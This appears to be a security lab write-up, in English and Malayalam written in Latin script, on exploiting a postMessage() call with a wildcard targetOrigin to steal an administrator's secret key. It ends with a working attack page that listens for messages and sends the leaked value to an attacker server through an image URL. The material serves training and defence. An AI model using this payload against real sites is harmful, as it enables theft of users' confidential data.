## Introduction
-->This exercise covers how insecure calls to the JavaScript function postMessage() can be used to leak sensitive information
-->This course details the exploitation of an application using postMessage without setting a destination. Using this issue you will be able to get an administrator to leak confidential information to your server. This challenge is based on the following content: [postMessage issues](https://github.com/EdOverflow/bugbountywiki/wiki/postMessage-issues) and [The pitfalls of postMessage](https://labs.detectify.com/2016/12/08/the-pitfalls-of-postmessage/).

## JavaScript postMessage()
-->According to [Mozilla documentation](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage):
- "The window.postMessage() method safely enables cross-origin communication between Window objects; e.g., between a page and a pop-up that it spawned, or between a page and an iframe embedded within it.
-->However, if the application relies on cookies and the opened page sends back sensitive information to the opening page without enforcing a targetOrigin, it's possible for a malicious page to get access to this sensitive information by getting users to visit a malicious page.
-->To prevent this issue, the backend should avoid using * as the second argument of postMessage (targetOrigin).

-->To exploit this issue, you will need to create a malicious HTML page that will open the vulnerable page and listen for events coming from the vulnerable page. You can use the code of the vulnerable application to see how to use postMessage(). This should allow you to open the vulnerable page with a listener that you will use to leak information back to your server. An easy way to do this is to create `<img tag pointing back to your malicious and embedding the leaked data as part of the URL.`

## Conclusion
-->This exercise showed you a way to exploit a page that uses postMessage without restriction on the targetOrigin. This allowed opening the page as the legitimate application would and use this to leak sensitive information back to your server.

# Video Explanation
## Video 1 - introduction
-->oru application thane rand windows open chythekum.so ee rand windowsum thamil communicate  chyendi verum.like sending some messages
-->ee message receive chyenda window oru eventListener fn vech kathirikum athupole message chyuna window postMessage() enna fn vech send chyum
-->postMessage fn ingan eaan veruka :
```js
<script>
....
postMessage(message,"http://example/")
....
</script>
```
-->adyathe argument message aanen kanikan ullathum. randmatheth target um aan
-->pakshe pandathe developers inganen target url kodukunathin pakkaram wildcard use chyum ie, `postMessage(sensitive_message,"*")` ingane star idumbol ella url ilekum ee sesitive message send chyum ok
-->so namal oru malicious website undaki ee post message il ninum veruna message receive chyuna reethiyil eventListener aaki vechal namk aa messages oke kitum ok

## The attack
- Create a malicious page that leaks informations received via events (using an <img tag for example)
- Make your malicious page open the vulnerable website using window.open in javascript
- Get the victim to visit your malicious website

## Video 2 - exploitation
-->ivide namal oru accoutn akit oru secret key add chyyka.enit athinte tottapurath decrytp enna button und ath click chythal aa secret key decrypt aayikolum
-->ini decrypt chythatin sehsham namal view-source adichal kanan patum oru eventhandler fn vahi aan ee decryption nadanethen ok
```js
<script>window.addEventListener("message", function(event){
	document.getElementById("value"+event.data.id).innerHTML event.data.value;}, false);
</script>
```
-->ini aa decrypt button inspect element adich nokiyal kanan patum :
```html
<button class="btn btn-danger" onclick='window.open("/key/0","ptlabdata0","height=200,width=150")'>Decrypt</button>
```
-->so namal namude lab url um pine ee /key/0 um cherth search chyuke ie->http://ptl-7a6d6bc7-85705a70.libcurl.so/key/0
-->ipol page il prathyekich onum kanikila but aa page view-source adichu nokiyal :
```html
<html>
<script>
  window.opener.postMessage({"id":0,"value":"hellojosu"}, '*');
  window.close();
</script>
</html>
```
-->see namude secret key aan ath. ath kidakunath postMessage enna js fn nte ullil aan. ivide main aayi nokendath namude secet key argument in shehsma veruna argument nok ie, `*`  means eth url ilum ee message send chyum.so namal ee logic aan exploit chyunath.so namal aadyam eduth eventListener code eduth namude editor il paste chyth modify chyth namal exploit chyanam :
```html
<html>

<script>window.addEventListener("message", function(event) { document.write("<img src='http://our-ip/?leak="+event.data.value+"'></img>"); }, false);

window.open("http://demo.libcurl.so/key/0");
</script>
</html>
```
-->ee script oru html file il aaki.namude terminalil webserver open aakit chythamahthi admin te key namuk kitikolum